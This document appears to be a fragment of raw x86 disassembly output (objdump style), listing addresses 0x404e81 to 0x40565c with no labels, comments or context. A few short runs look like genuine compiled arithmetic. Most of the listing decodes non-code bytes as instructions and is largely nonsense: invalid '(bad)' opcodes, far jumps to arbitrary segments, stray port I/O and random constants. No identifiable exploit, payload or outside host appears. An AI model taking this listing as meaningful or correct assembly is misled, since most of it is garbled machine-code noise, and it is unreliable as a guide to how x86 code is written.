  404e81:	mov    BYTE PTR [eax-0xb],0x37
  404e85:	dec    esp
  404e86:	xchg   edx,eax
  404e87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e88:	mov    ebp,0x65366529
  404e8d:	adc    BYTE PTR [eax+eiz*4-0x7],0x59
  404e92:	fidivr WORD PTR [ebp*8-0x78459d73]
  404e99:	das    
  404e9a:	js     0x404e97
  404e9c:	lahf   
  404e9d:	push   es
  404e9e:	jl     0x4ddc8999
  404ea4:	xchg   esp,eax
  404ea5:	mov    ebx,0xc0c066be
  404eaa:	sti    
  404eab:	jb     0x404ea8
  404ead:	popf   
  404eae:	xchg   ebp,eax
  404eaf:	mov    ah,0xc7
  404eb1:	jmp    0x1eba:0x17324fe7
  404eb8:	mov    ch,0x6a
  404eba:	fbld   TBYTE PTR [ecx+0x1b]
  404ebd:	or     eax,0x931448af
  404ec2:	sub    DWORD PTR [eax-0x36],edx
  404ec5:	(bad)  
  404ec6:	sbb    edx,DWORD PTR [ecx]
  404ec8:	xor    eax,edi
  404eca:	xor    edx,edx
  404ecc:	or     eax,edx
  404ece:	mov    cl,BYTE PTR [eax+ecx*1]
  404ed1:	mov    eax,DWORD PTR [ebp-0x34]
  404ed4:	or     BYTE PTR [eax],cl
  404ed6:	mov    eax,DWORD PTR [ebp-0x10]
  404ed9:	mov    ecx,DWORD PTR [ebp-0xc]
  404edc:	shrd   eax,ecx,0x2
  404ee0:	shr    ecx,0x2
  404ee3:	mov    ecx,DWORD PTR [ebp-0x10]
  404ee6:	mov    edx,DWORD PTR [ebp-0xc]
  404ee9:	xor    eax,edi
  404eeb:	shl    ecx,0x1e
  404eee:	xor    edx,edx
  404ef0:	or     eax,edx
  404ef2:	lea    eax,[ebp+eax*1-0x4]
  404ef6:	mov    DWORD PTR [ebp-0x34],eax
  404ef9:	mov    eax,DWORD PTR [ebp-0x10]
  404efc:	mov    ecx,DWORD PTR [ebp-0xc]
  404eff:	shrd   eax,ecx,0x2
  404f03:	shr    ecx,0x2
  404f06:	mov    ecx,DWORD PTR [ebp-0x10]
  404f09:	mov    edx,DWORD PTR [ebp-0xc]
  404f0c:	xor    eax,edi
  404f0e:	shl    ecx,0x1e
  404f11:	mov    ecx,DWORD PTR [ebp-0x14]
  404f14:	xor    edx,edx
  404f16:	or     eax,edx
  404f18:	mov    cl,BYTE PTR [eax+ecx*1]
  404f1b:	mov    eax,DWORD PTR [ebp-0x34]
  404f1e:	add    BYTE PTR [eax],cl
  404f20:	mov    eax,DWORD PTR [ebp-0x60]
  404f23:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f26:	shrd   eax,ecx,0x2
  404f2a:	shr    ecx,0x2
  404f2d:	mov    ecx,DWORD PTR [ebp-0x60]
  404f30:	mov    edx,DWORD PTR [ebp-0x5c]
  404f33:	xor    eax,edi
  404f35:	xor    edx,edx
  404f37:	or     eax,edx
  404f39:	lea    eax,[ebp+eax*1-0x4]
  404f3d:	mov    DWORD PTR [ebp-0x34],eax
  404f40:	mov    eax,DWORD PTR [ebp-0x60]
  404f43:	shl    ecx,0x1e
  404f46:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f49:	shrd   eax,ecx,0x2
  404f4d:	shr    ecx,0x2
  404f50:	mov    ecx,DWORD PTR [ebp-0x60]
  404f53:	mov    edx,DWORD PTR [ebp-0x5c]
  404f56:	xor    eax,edi
  404f58:	xor    edx,edx
  404f5a:	or     eax,edx
  404f5c:	mov    edx,DWORD PTR [ebp+0x14]
  404f5f:	shl    ecx,0x1e
  404f62:	mov    ecx,DWORD PTR [ebp-0x14]
  404f65:	mov    cl,BYTE PTR [eax+ecx*1]
  404f68:	mov    eax,DWORD PTR [ebp-0x34]
  404f6b:	or     BYTE PTR [eax],cl
  404f6d:	jmp    0x40530e
  404f72:	mov    DWORD PTR [edx],ecx
  404f74:	push   0xabac68c5
  404f79:	mov    al,BYTE PTR [edi-0x276df5c0]
  404f7f:	dec    eax
  404f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f81:	jecxz  0x404f41
  404f83:	adc    DWORD PTR [esi-0x413b4242],edi
  404f89:	mov    esi,0x9268d3ee
  404f8e:	shr    esi,cl
  404f90:	xor    al,0x7e
  404f92:	out    dx,al
  404f93:	out    dx,eax
  404f94:	jp     0x404f6f
  404f96:	dec    ebx
  404f97:	dec    esi
  404f98:	inc    ebx
  404f99:	cdq    
  404f9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f9b:	or     bh,BYTE PTR [ebp-0xf9bebe]
  404fa1:	mov    edx,0xe76101b5
  404fa6:	jge    0x404ff8
  404fa8:	xchg   ebp,eax
  404fa9:	mov    dl,0xf1
  404fab:	add    eax,0xc44b5e47
  404fb0:	mov    al,ds:0xcf4e8f94
  404fb5:	pop    eax
  404fb6:	bound  ecx,QWORD PTR [esi-0x6b2938f3]
  404fbc:	lods   al,BYTE PTR ds:[esi]
  404fbd:	in     al,dx
  404fbe:	arpl   sp,cx
  404fc0:	cdq    
  404fc1:	pop    eax
  404fc2:	adc    eax,edx
  404fc4:	sub    al,0x60
  404fc6:	repnz ficomp DWORD PTR [edx+0x30]
  404fca:	bound  esi,QWORD PTR ds:0x474f63b0
  404fd0:	fsub   DWORD PTR [ebp+edi*1+0x72]
  404fd4:	add    esp,0x25
  404fd7:	aaa    
  404fd8:	sub    dl,ah
  404fda:	call   0xadbb4cc8
  404fdf:	mov    dl,0x29
  404fe1:	mov    ebx,0xcc466d2
  404fe6:	call   0x3cfa2ae4
  404feb:	mov    eax,0xbe69e463
  404ff0:	jbe    0x405040
  404ff2:	mov    ch,0x7c
  404ff4:	aas    
  404ff5:	pusha  
  404ff6:	cli    
  404ff7:	sbb    edi,edi
  404ff9:	add    ecx,edx
  404ffb:	add    ecx,esp
  404ffd:	adc    BYTE PTR ds:0x454d06fe,ch
  405003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405004:	dec    ebp
  405005:	inc    ebp
  405006:	adc    DWORD PTR [edx],ecx
  405008:	iret   
  405009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40500a:	call   0x6e32:0xfbd224a
  405011:	les    esp,FWORD PTR [ebx+0x13]
  405014:	hlt    
  405015:	and    ebx,DWORD PTR [ebx-0x18]
  405018:	or     al,0x5
  40501a:	jne    0x405053
  40501c:	lea    edx,[esi-0x78]
  40501f:	shl    BYTE PTR [esi-0x56],0xa8
  405023:	jg     0x405057
  405025:	test   DWORD PTR [ecx],0x85d45e5
  40502b:	cmp    DWORD PTR ds:0x87f82067,esi
  405031:	dec    edx
  405032:	int    0x20
  405034:	pop    esp
  405035:	xchg   DWORD PTR [esi],eax
  405037:	sbb    eax,DWORD PTR [esi-0x2a]
  40503a:	dec    eax
  40503b:	dec    ebx
  40503c:	cmp    dl,BYTE PTR [esp+ebp*8+0x114c80f4]
  405043:	mov    BYTE PTR [ebx+0x44],cl
  405046:	pop    edx
  405047:	(bad)  
  405049:	or     eax,0xc00599b6
  40504e:	lock int 0x14
  405051:	add    DWORD PTR [edi+0x12e53b0c],0xce676ecb
  40505b:	and    al,0x3d
  40505d:	xchg   edi,eax
  40505e:	mov    ds:0xb310ee58,eax
  405063:	aad    0xf
  405065:	add    DWORD PTR [edx-0x7e164517],ecx
  40506b:	stos   BYTE PTR es:[edi],al
  40506c:	daa    
  40506d:	cld    
  40506e:	jge    0x4050c8
  405070:	pop    edx
  405071:	xor    ebx,DWORD PTR [ecx+esi*1-0x3ef73747]
  405078:	add    al,0x7b
  40507a:	cmp    BYTE PTR [ecx],ch
  40507c:	das    
  40507d:	push   ebx
  40507e:	out    dx,al
  40507f:	sub    edx,DWORD PTR [ecx-0xf]
  405082:	scas   al,BYTE PTR es:[edi]
  405083:	jl     0x405032
  405085:	jp     0x40509a
  405087:	mov    esi,0x2903a3ac
  40508c:	jmp    0x6e96:0xc9bc6064
  405093:	cdq    
  405094:	mov    ebx,0x61f1e2f2
  405099:	push   esp
  40509a:	push   ecx
  40509b:	test   esp,esp
  40509d:	jle    0x4050b3
  40509f:	pushf  
  4050a0:	push   esp
  4050a1:	sbb    eax,0xff24c2e
  4050a6:	(bad)  
  4050a7:	and    eax,0xc899146f
  4050ac:	enter  0x7449,0x15
  4050b0:	jno    0x4050d0
  4050b2:	jnp    0x4050f4
  4050b4:	in     eax,0x73
  4050b6:	xor    eax,0x7edd38ff
  4050bb:	sti    
  4050bc:	push   edx
  4050bd:	pop    ebp
  4050be:	div    ebp
  4050c0:	test   DWORD PTR [edi+esi*8+0x10e340c6],ebx
  4050c7:	and    eax,0x3eb217a8
  4050cc:	gs mov eax,0x55c979b8
  4050d2:	lock mov ss,WORD PTR [edx]
  4050d5:	adc    eax,0xbc5b409b
  4050da:	lods   eax,DWORD PTR ds:[esi]
  4050db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050dc:	dec    eax
  4050dd:	inc    esp
  4050de:	ds jns 0x4050fb
  4050e1:	xchg   esi,edx
  4050e3:	daa    
  4050e4:	div    DWORD PTR [edx]
  4050e6:	std    
  4050e7:	mov    esp,0xc5259d71
  4050ec:	inc    edx
  4050ed:	jo     0x405081
  4050ef:	std    
  4050f0:	mov    al,ds:0x837b5432
  4050f5:	mov    cl,0xbf
  4050f7:	jnp    0x40507b
  4050f9:	aam    0xb7
  4050fb:	and    bl,BYTE PTR [eax+0x26077f03]
  405101:	or     BYTE PTR [ebp+0x5eae77de],0x1e
  405108:	mov    BYTE PTR [esi-0x6633bf88],bh
  40510e:	test   dh,0x9e
  405111:	adc    al,0x45
  405113:	mov    ch,0x46
  405115:	cli    
  405116:	fdivr  DWORD PTR [eax+0x55d4a36e]
  40511c:	pop    eax
  40511d:	jno    0x405149
  40511f:	pop    eax
  405120:	ins    BYTE PTR es:[edi],dx
  405121:	mov    esi,DWORD PTR [ebx+0x4d]
  405124:	push   ecx
  405125:	pop    es
  405126:	out    0x7f,eax
  405128:	out    0x4e,eax
  40512a:	loope  0x405154
  40512c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40512d:	mov    ebp,0xb63e47e3
  405132:	sbb    ebx,DWORD PTR cs:[edi+0x4]
  405136:	dec    edx
  405137:	jnp    0x405143
  405139:	mov    edi,0x6a10b0a8
  40513e:	mov    bh,0xa6
  405140:	(bad)  
  405141:	mov    eax,ds:0xf3048800
  405146:	jno    0x4051af
  405148:	das    
  405149:	rol    ecx,0x1d
  40514c:	dec    eax
  40514d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40514e:	push   ebp
  40514f:	in     al,dx
  405150:	mov    ah,bh
  405152:	scas   eax,DWORD PTR es:[edi]
  405153:	in     al,0x6f
  405155:	mov    dl,0xa8
  405157:	push   edi
  405158:	adc    DWORD PTR [edi],ebp
  40515a:	cmc    
  40515b:	loope  0x405173
  40515d:	test   DWORD PTR [edx-0x6b5da1e8],0xa1a7672b
  405167:	adc    BYTE PTR [edi-0x12],dh
  40516a:	loopne 0x405111
  40516c:	pusha  
  40516d:	test   DWORD PTR [eax+0x72],edi
  405170:	clc    
  405171:	pop    edx
  405172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405174:	mov    ds:0x98702b2b,al
  405179:	mov    dh,0x7e
  40517b:	sbb    ah,BYTE PTR [ebx*4+0x559b59bd]
  405182:	jb     0x40512c
  405184:	jge    0x4051f5
  405186:	adc    ah,BYTE PTR [edi-0x230d8673]
  40518c:	stos   BYTE PTR es:[edi],al
  40518d:	adc    BYTE PTR [edx],0x7b
  405190:	or     BYTE PTR [edx+eax*1+0x21],al
  405194:	scas   eax,DWORD PTR es:[edi]
  405195:	xor    BYTE PTR [edx+0x3567959c],cl
  40519b:	pop    eax
  40519c:	mov    ds:0x5a6c0a3,eax
  4051a1:	shr    DWORD PTR [ebx-0x72],1
  4051a4:	inc    ebp
  4051a5:	sub    BYTE PTR [edi],dl
  4051a7:	or     BYTE PTR [ecx-0x71],bh
  4051aa:	mov    al,ds:0xa5ff0d63
  4051af:	mov    esp,0xb81cf7d0
  4051b4:	lea    edi,[ebx+0x31]
  4051b7:	stos   DWORD PTR es:[edi],eax
  4051b8:	jne    0x4051d7
  4051ba:	push   edi
  4051bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051bc:	xor    eax,0xacf4b6ab
  4051c1:	cwde   
  4051c2:	pushw  es
  4051c4:	dec    ebx
  4051c5:	lods   eax,DWORD PTR ds:[esi]
  4051c6:	jl     0x4051aa
  4051c8:	cmp    eax,0xd5abce06
  4051cd:	in     eax,0xbb
  4051cf:	imul   DWORD PTR [ecx+0x32]
  4051d2:	in     eax,dx
  4051d3:	mov    bl,0xf5
  4051d5:	outs   dx,DWORD PTR ds:[esi]
  4051d6:	sub    cl,bl
  4051d8:	outs   dx,BYTE PTR ds:[esi]
  4051d9:	sar    BYTE PTR [edi+0x70],1
  4051dc:	in     al,dx
  4051dd:	les    esp,FWORD PTR [ecx-0x226689e4]
  4051e3:	mul    DWORD PTR [eax]
  4051e5:	jb     0x405241
  4051e7:	sbb    dl,bl
  4051e9:	xor    ch,BYTE PTR [edx+0x1e]
  4051ec:	sub    dh,BYTE PTR ds:0x4d6d3ec8
  4051f2:	push   edx
  4051f3:	push   esi
  4051f4:	setbe  BYTE PTR ds:0xf59c2ade
  4051fb:	dec    ebx
  4051fc:	ds out dx,al
  4051fe:	aad    0x60
  405200:	cwde   
  405201:	fisttp QWORD PTR [esi-0x20dbeb3b]
  405207:	jne    0x405218
  405209:	sbb    al,0x3e
  40520b:	xchg   ebx,eax
  40520c:	add    al,0x7d
  40520e:	mov    cl,0x6c
  405210:	push   0x7bdd6fb5
  405215:	jmp    0xace4:0x7ef6bb98
  40521c:	cwde   
  40521d:	pop    eax
  40521e:	lods   al,BYTE PTR ds:[esi]
  40521f:	or     dl,BYTE PTR [edi+0x39aac992]
  405225:	pop    ecx
  405226:	cmp    dl,BYTE PTR [edi+eiz*1-0x35777b9a]
  40522d:	or     eax,0xf5e5d367
  405232:	mov    bl,0x79
  405234:	xchg   BYTE PTR [ecx+0x181a72b0],al
  40523a:	dec    esp
  40523b:	inc    edx
  40523c:	jg     0x40525f
  40523e:	data16 out dx,al
  405240:	jmp    0xb9c50815
  405245:	and    DWORD PTR [ebp-0x32],ebx
  405248:	sbb    edi,eax
  40524a:	sub    BYTE PTR [ebx-0x4f914c36],ah
  405250:	add    DWORD PTR [ebp-0x1128215a],esi
  405256:	fnsave [eax-0xd]
  405259:	fwait
  40525a:	mov    eax,ss
  40525c:	mov    BYTE PTR [eax-0x31],0xd3
  405260:	inc    ebp
  405261:	imul   ebx,DWORD PTR [eax],0xffffff9a
  405264:	jmp    0x40524e
  405266:	push   es
  405267:	pop    ebp
  405268:	mov    BYTE PTR [eax-0x3c49e17b],dl
  40526e:	stos   BYTE PTR es:[edi],al
  40526f:	adc    edi,DWORD PTR [ebx-0x7b615a62]
  405275:	mov    ah,bl
  405277:	lahf   
  405278:	cwde   
  405279:	inc    ecx
  40527a:	push   ds
  40527b:	adc    dl,BYTE PTR [ebp+0xc]
  40527e:	xlat   BYTE PTR ds:[ebx]
  40527f:	test   eax,0x89d6ddec
  405284:	jmp    0xf24c:0xca3d6260
  40528b:	adc    BYTE PTR [esi],al
  40528d:	and    cl,0x1
  405290:	add    esp,DWORD PTR [ecx+0xb1774e5]
  405296:	fwait
  405297:	sbb    dh,BYTE PTR [edi+ebp*1+0x79f40879]
  40529e:	dec    esp
  40529f:	mov    ch,0xea
  4052a1:	pusha  
  4052a2:	nop
  4052a3:	popa   
  4052a4:	ret    0xcff2
  4052a7:	adc    eax,0xbf3f8686
  4052ac:	push   ebp
  4052ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052ae:	sub    DWORD PTR [ecx],esi
  4052b0:	pop    edx
  4052b1:	adc    ebx,DWORD PTR [ebx-0x2cdcb30c]
  4052b7:	adc    edi,DWORD PTR [ebp-0x1c]
  4052ba:	and    bh,BYTE PTR [ebp-0x41417790]
  4052c0:	test   al,0x4e
  4052c2:	adc    al,0xd0
  4052c4:	jno    0x40531c
  4052c6:	das    
  4052c7:	fs pop ecx
  4052c9:	loop   0x4052c6
  4052cb:	dec    eax
  4052cc:	out    dx,al
  4052cd:	push   eax
  4052ce:	in     eax,dx
  4052cf:	push   ebx
  4052d0:	(bad)  
  4052d1:	jmp    0x40531b
  4052d3:	scas   eax,DWORD PTR es:[edi]
  4052d4:	hlt    
  4052d5:	mov    dl,0x4f
  4052d7:	(bad)  
  4052d8:	mov    esi,0x4f835ce2
  4052dd:	stos   BYTE PTR es:[edi],al
  4052de:	inc    esi
  4052df:	sub    BYTE PTR [ebp-0x4be1123f],ch
  4052e5:	sub    dl,ch
  4052e7:	or     esp,0xffffffc7
  4052ea:	pop    ebx
  4052eb:	jno    0x4052ba
  4052ed:	shl    DWORD PTR [ebx+0x30],1
  4052f0:	mov    esp,ecx
  4052f2:	adc    eax,0xd4333701
  4052f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052f8:	dec    esp
  4052f9:	aam    0xdb
  4052fb:	adc    ch,bl
  4052fd:	sub    dh,BYTE PTR ds:0x94729eff
  405303:	je     0x4052a0
  405305:	imul   ebp,DWORD PTR [edx],0xffffffc2
  405308:	mov    ds:0x2d5337a6,al
  40530d:	inc    ebp
  40530e:	mov    eax,DWORD PTR [ebp+0x10]
  405311:	mov    ecx,eax
  405313:	shrd   ecx,edx,0x2
  405317:	shl    eax,0x1e
  40531a:	shr    edx,0x2
  40531d:	mov    DWORD PTR [ebp+0x14],edx
  405320:	mov    DWORD PTR [ebp+0x14],eax
  405323:	xor    edx,edx
  405325:	mov    eax,ecx
  405327:	jmp    0x4056c8
  40532c:	sub    eax,0x846700b2
  405331:	jnp    0x4052e9
  405333:	mov    esp,0xe3d964fe
  405338:	cmp    al,0xf0
  40533a:	mov    BYTE PTR [ebp+edi*4-0x424141e9],ah
  405341:	les    edi,FWORD PTR [esi-0x224fa042]
  405347:	xchg   ecx,eax
  405348:	ror    dh,1
  40534a:	sub    eax,DWORD PTR [ebx-0x4a]
  40534d:	add    eax,esp
  40534f:	cs inc ebx
  405351:	outs   dx,BYTE PTR ds:[esi]
  405352:	je     0x4052e5
  405354:	mov    bh,0xbb
  405356:	ins    BYTE PTR es:[edi],dx
  405357:	(bad)  
  405358:	and    edx,DWORD PTR gs:[ecx+ebp*2]
  40535c:	mov    edx,DWORD PTR [edx+0x7c]
  40535f:	add    ebp,esi
  405361:	neg    DWORD PTR [eax-0x21a6f7c9]
  405367:	xchg   edx,eax
  405368:	xchg   ecx,eax
  405369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40536a:	stc    
  40536b:	sbb    ecx,DWORD PTR [ecx-0x2b]
  40536e:	mov    eax,0xeb258d94
  405373:	int    0x40
  405375:	sti    
  405376:	push   0x3789314b
  40537b:	mov    edi,DWORD PTR [ebx]
  40537d:	sti    
  40537e:	inc    edx
  40537f:	dec    ebp
  405380:	mov    ebp,0x56fe282e
  405385:	xchg   ecx,eax
  405386:	out    0x5e,eax
  405388:	jne    0x4053c5
  40538a:	loopne 0x405310
  40538c:	jge    0x405323
  40538e:	inc    edi
  40538f:	pop    esi
  405390:	(bad)  
  405391:	dec    esp
  405392:	scas   al,BYTE PTR es:[edi]
  405393:	int    0x1e
  405395:	jle    0x4053f2
  405397:	repz shl BYTE PTR ds:0x259884ee,1
  40539e:	sbb    al,0x44
  4053a0:	sbb    esi,ebx
  4053a2:	and    esi,DWORD PTR [ecx-0x3bb22260]
  4053a8:	call   0x3cb0:0x3039adb5
  4053af:	push   ecx
  4053b0:	lea    esp,ds:0x9bf520e3
  4053b6:	stos   BYTE PTR es:[edi],al
  4053b7:	dec    esi
  4053b8:	inc    ebp
  4053b9:	iret   
  4053ba:	xchg   DWORD PTR [esi],eax
  4053bc:	mov    edi,0xb7fc79c0
  4053c1:	dec    edx
  4053c2:	push   ebx
  4053c3:	cmp    DWORD PTR fs:0xcba1df01,edx
  4053ca:	shl    BYTE PTR [ecx],cl
  4053cc:	mov    ebx,0x7d9109f9
  4053d1:	fld    QWORD PTR [edx+0x7e]
  4053d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053d5:	jle    0x405406
  4053d7:	add    esi,DWORD PTR [eax-0x31]
  4053da:	push   esp
  4053db:	test   eax,0xbd37799c
  4053e0:	xlat   BYTE PTR ds:[ebx]
  4053e1:	or     BYTE PTR [edx+0x2ac43665],ch
  4053e7:	jmp    0x405444
  4053e9:	sti    
  4053ea:	cmp    DWORD PTR [ecx],esp
  4053ec:	gs or  al,0xd1
  4053ef:	fcmovnu st,st(0)
  4053f1:	push   esp
  4053f2:	in     eax,dx
  4053f3:	push   0x143744e9
  4053f8:	push   edx
  4053f9:	pop    ds
  4053fa:	mov    bl,BYTE PTR [esi]
  4053fc:	mov    cl,0xef
  4053fe:	into   
  4053ff:	push   ds
  405400:	popa   
  405401:	shr    BYTE PTR [esi+0x42],cl
  405404:	cmp    al,0x1e
  405406:	data16 test BYTE PTR [eax-0x7657eb30],ah
  40540d:	mov    eax,0x4984e4ba
  405412:	mov    es,WORD PTR [esi]
  405414:	inc    ebx
  405415:	inc    ecx
  405416:	mov    ds:0xaf22ba97,al
  40541b:	or     al,BYTE PTR [edi-0x5f]
  40541e:	push   0x967e945e
  405423:	cmp    DWORD PTR [ebp+0x57734f8c],esi
  405429:	pushf  
  40542a:	jmp    0x4053c7
  40542c:	adc    al,0x8e
  40542e:	cmp    eax,0x906d4f56
  405433:	or     eax,DWORD PTR [eax+esi*1]
  405436:	xlat   BYTE PTR ds:[ebx]
  405437:	jns    0x405432
  405439:	sub    dl,BYTE PTR ds:0x81743269
  40543f:	or     cl,BYTE PTR [edx-0x5860e6e9]
  405445:	and    eax,0x97f58df6
  40544a:	inc    esp
  40544b:	adc    DWORD PTR [esp+edx*2-0x3fad4042],esp
  405452:	adc    DWORD PTR [edx-0x335cd3bf],edx
  405458:	or     dh,BYTE PTR [ebx]
  40545a:	mov    cl,0xa1
  40545c:	inc    ecx
  40545d:	xchg   edx,eax
  40545e:	xor    ebp,ecx
  405460:	xchg   BYTE PTR [edx+0x21d5a151],ah
  405466:	shr    BYTE PTR [ebp-0x4f8ea797],0xbf
  40546d:	mov    DWORD PTR [edx+0x47],0xdac504d1
  405474:	xor    BYTE PTR ds:0xb5c68aa3,dh
  40547a:	shr    DWORD PTR [ebx+0x3e],0x4f
  40547e:	sbb    eax,ecx
  405480:	fsub   QWORD PTR [edi]
  405482:	sub    eax,0xd8fa1f96
  405487:	and    eax,0x93b416b9
  40548c:	cwde   
  40548d:	jg     0x40548a
  40548f:	sbb    al,0x45
  405491:	nop
  405492:	retf   
  405493:	outs   dx,DWORD PTR ds:[esi]
  405494:	or     dh,bh
  405496:	mov    ss,WORD PTR [edi+0x5f44b5b5]
  40549c:	sub    BYTE PTR [edi-0x3f],ah
  40549f:	adc    edx,ebx
  4054a1:	les    esi,FWORD PTR [esi-0x528692af]
  4054a7:	jae    0x405488
  4054a9:	mov    bh,0x35
  4054ab:	cmc    
  4054ac:	std    
  4054ad:	dec    eax
  4054ae:	int3   
  4054af:	aad    0x18
  4054b1:	lahf   
  4054b2:	sbb    eax,0x9ebd2eae
  4054b7:	test   DWORD PTR [ebx],ebp
  4054b9:	stos   DWORD PTR es:[edi],eax
  4054ba:	imul   eax,edi,0x5f0782d6
  4054c0:	cmp    ch,dh
  4054c2:	loope  0x405449
  4054c4:	pop    ds
  4054c5:	outs   dx,DWORD PTR ds:[esi]
  4054c6:	outs   dx,BYTE PTR ds:[esi]
  4054c7:	mov    edx,0x53ceec38
  4054cc:	sub    esp,esi
  4054ce:	arpl   WORD PTR [edi],bp
  4054d0:	mov    edi,0x69f631b3
  4054d5:	(bad)  
  4054d6:	mov    cl,0x2a
  4054d8:	xor    DWORD PTR [esp+esi*1],edx
  4054db:	out    0x6a,al
  4054dd:	mov    WORD PTR [ecx+ebx*4+0x2f646735],gs
  4054e4:	addr16 popa 
  4054e6:	dec    ebp
  4054e7:	loopne 0x40553b
  4054e9:	or     bl,BYTE PTR [edi]
  4054eb:	mov    cl,0xe3
  4054ed:	jecxz  0x4054c7
  4054ef:	jae    0x405564
  4054f1:	outs   dx,DWORD PTR ds:[esi]
  4054f2:	mov    al,0x1d
  4054f4:	add    BYTE PTR [eax],dl
  4054f6:	sbb    eax,0x5765b80a
  4054fb:	sti    
  4054fc:	mov    ds:0xe9cdb4af,eax
  405501:	cmp    eax,0x2d64261e
  405506:	push   esp
  405507:	bound  esp,QWORD PTR [ecx-0x945a3fd]
  40550d:	call   0x608568dc
  405512:	icebp  
  405513:	imul   esp,DWORD PTR [edi+0x37699ab0],0xffffff8c
  40551a:	mov    bh,0x6f
  40551c:	mov    WORD PTR [ecx+esi*4+0x14d5f978],ss
  405523:	or     cl,al
  405525:	push   ss
  405526:	stos   DWORD PTR es:[edi],eax
  405527:	add    bl,BYTE PTR [ebx+0xf46a238]
  40552d:	inc    eax
  40552e:	pop    ebx
  40552f:	adc    ah,BYTE PTR [eax+0x3f08f043]
  405535:	cvtps2pi mm2,QWORD PTR [edi-0x5b9e16e]
  40553c:	xor    al,0x52
  40553e:	repnz repz xor BYTE PTR [ecx+0x5d],0x22
  405544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405545:	mov    bh,0xea
  405547:	imul   edx,DWORD PTR [eax+0x5e75aba1],0x19
  40554e:	adc    al,0xaa
  405550:	dec    eax
  405551:	jmp    0xe492:0x82980890
  405558:	pusha  
  405559:	mov    ecx,0x79416a0a
  40555e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40555f:	hlt    
  405560:	pop    ebx
  405561:	cmp    al,0xc6
  405563:	mov    edi,0xc783aa5
  405568:	jp     0x40556c
  40556a:	ins    DWORD PTR es:[edi],dx
  40556b:	push   eax
  40556c:	add    BYTE PTR [esi-0x7],dh
  40556f:	lahf   
  405570:	push   ds
  405571:	pushf  
  405572:	aas    
  405573:	test   eax,0x520ca46b
  405578:	dec    ebp
  405579:	xchg   BYTE PTR [eax+0x62415e6],dl
  40557f:	cmc    
  405580:	mov    esp,0x13d04b0a
  405585:	inc    eax
  405586:	or     BYTE PTR [eax-0x49],bl
  405589:	add    dl,BYTE PTR [ecx-0x19]
  40558c:	dec    esp
  40558d:	popf   
  40558e:	test   DWORD PTR [esi-0x45927cce],esp
  405594:	cmp    DWORD PTR [ecx+0xe6b1761],0xf577c1de
  40559e:	cdq    
  40559f:	mov    ecx,esp
  4055a1:	arpl   WORD PTR ds:0x23be0086,ax
  4055a7:	pushf  
  4055a8:	add    eax,0x2bfcc73a
  4055ad:	mov    bh,0xc5
  4055af:	daa    
  4055b0:	mov    bl,0x8
  4055b2:	push   edx
  4055b3:	push   edi
  4055b4:	gs into 
  4055b6:	in     eax,dx
  4055b7:	cs push edi
  4055b9:	clc    
  4055ba:	mov    bl,0x72
  4055bc:	int    0x27
  4055be:	outs   dx,DWORD PTR ds:[esi]
  4055bf:	es jl  0x405631
  4055c2:	and    BYTE PTR [esi-0x54867a5],ah
  4055c8:	ins    DWORD PTR es:[edi],dx
  4055c9:	xor    BYTE PTR [esi-0x1ac844ab],ch
  4055cf:	iret   
  4055d0:	mov    cs,WORD PTR [edi+ecx*8]
  4055d3:	mov    cl,0x4b
  4055d5:	mov    bl,0xcf
  4055d7:	dec    sp
  4055d9:	fisttp WORD PTR [esi+esi*1+0x4e552c70]
  4055e0:	(bad)  
  4055e1:	mov    ebp,0xc307f474
  4055e6:	jno    0x40560e
  4055e8:	mov    WORD PTR [ecx+eax*1+0x1a3124d1],ds
  4055ef:	test   al,0x95
  4055f1:	into   
  4055f2:	push   ecx
  4055f3:	jmp    0x7ced832c
  4055f8:	(bad)  
  4055f9:	out    0xb3,eax
  4055fb:	(bad)  [eax]
  4055fd:	lods   eax,DWORD PTR ds:[esi]
  4055fe:	ret    
  4055ff:	fcom   DWORD PTR [edi*1-0x421f3e29]
  405606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405607:	xchg   ebp,eax
  405608:	pusha  
  405609:	adc    al,0xd9
  40560b:	push   ss
  40560c:	std    
  40560d:	aam    0xc5
  40560f:	ins    BYTE PTR es:[edi],dx
  405610:	sbb    esp,ebp
  405612:	ins    BYTE PTR es:[edi],dx
  405613:	aas    
  405614:	call   0x6e3027ca
  405619:	in     eax,0xc1
  40561b:	stc    
  40561c:	and    BYTE PTR [eax],dl
  40561e:	sbb    al,0xd2
  405620:	hlt    
  405621:	(bad)  
  405622:	js     0x40568c
  405624:	add    cl,ch
  405626:	push   ebp
  405627:	add    bl,BYTE PTR [ebp-0x3bbdc430]
  40562d:	mov    cs,eax
  40562f:	pop    ebp
  405630:	aam    0xaa
  405632:	jecxz  0x4056a6
  405634:	loope  0x405630
  405636:	dec    ecx
  405637:	or     edx,DWORD PTR [ebp-0x48]
  40563a:	pushf  
  40563b:	xchg   edx,eax
  40563c:	jno    0x40562b
  40563e:	cwde   
  40563f:	jno    0x40562a
  405641:	jns    0x40564e
  405643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405644:	hlt    
  405645:	call   0x2274:0xced84834
  40564c:	out    0x71,al
  40564e:	mov    cl,0x4e
  405650:	retf   0x7fad
  405653:	jb     0x405679
  405655:	or     ebp,ecx
  405657:	std    
  405658:	xchg   edi,eax
  405659:	sub    ebp,edx
  40565b:	stos   DWORD PTR es:[edi],eax
  40565c:	jle    0x4056b0
